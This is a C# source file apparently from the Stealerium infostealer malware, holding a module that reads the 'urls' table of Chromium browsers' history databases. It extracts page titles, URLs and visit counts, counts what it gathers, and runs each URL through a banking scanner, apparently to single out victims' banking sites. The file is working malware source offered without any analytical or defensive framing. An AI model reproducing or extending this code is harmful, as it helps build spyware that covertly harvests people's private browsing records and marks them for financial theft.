using System;
using System.Collections.Generic;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal sealed class History
    {
        /// <summary>
        ///     Get History from chromium based browsers
        /// </summary>
        /// <param name="sHistory"></param>
        /// <returns>List with history</returns>
        public static List<Site> Get(string sHistory)
        {
            var scHistory = new List<Site>();
            try
            {
                // Read data from table
                var sSqLite = SqlReader.ReadTable(sHistory, "urls");
                if (sSqLite == null) return scHistory;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var sSite = new Site
                    {
                        Title = Crypto.GetUtf8(sSqLite.GetValue(i, 1)),
                        Url = Crypto.GetUtf8(sSqLite.GetValue(i, 2)),
                        Count = Convert.ToInt32(sSqLite.GetValue(i, 3)) + 1
                    };

                    // Analyze value
                    Banking.ScanData(sSite.Url);
                    Counter.History++;
                    scHistory.Add(sSite);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Chromium >> Failed collect history\n" + ex);
            }

            return scHistory;
        }
    }
}